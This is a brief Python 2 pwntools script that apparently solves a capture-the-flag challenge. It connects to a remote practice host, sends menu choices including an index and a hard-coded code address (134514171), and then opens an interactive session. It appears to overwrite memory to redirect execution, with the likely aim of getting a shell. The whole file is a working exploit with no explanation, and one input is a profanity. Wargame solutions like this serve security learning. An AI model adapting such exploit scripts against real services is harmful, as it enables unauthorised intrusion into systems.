#!/usr/bin/env python2

from pwn import *

p = remote('hackme.inndy.tw', 7701)
p.sendlineafter("What's your name?", 'fuck you')
p.sendlineafter('>', '1')
p.sendlineafter(':', '14')
p.sendlineafter('?', '134514171')
p.sendline('0')

p.interactive()
p.close()
